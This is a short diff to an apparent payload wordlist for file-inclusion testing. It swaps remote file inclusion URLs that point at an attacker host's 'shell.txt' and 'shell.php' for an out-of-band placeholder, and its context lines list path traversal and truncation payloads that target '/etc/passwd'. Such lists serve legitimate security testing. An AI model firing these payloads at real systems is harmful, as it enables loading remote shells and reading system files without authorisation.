@@ -348,12 +348,12 @@ phar:///var/www/html/storage/uploads/test.phar
 /app/..;/../etc/passwd
 
 # ── REMOTE FILE INCLUSION ──
-http://attacker.com/shell.txt
-http://attacker.com/shell.php
-https://attacker.com/shell.txt
-ftp://attacker.com/shell.txt
-\\attacker.com\shell
-//attacker.com/shell
+http://{{OOB}}/shell.txt
+http://{{OOB}}/shell.php
+https://{{OOB}}/shell.txt
+ftp://{{OOB}}/shell.txt
+\\{{OOB}}\shell
+//{{OOB}}/shell
 
 # ── TRUNCATION TRICKS ──
 /etc/passwd.
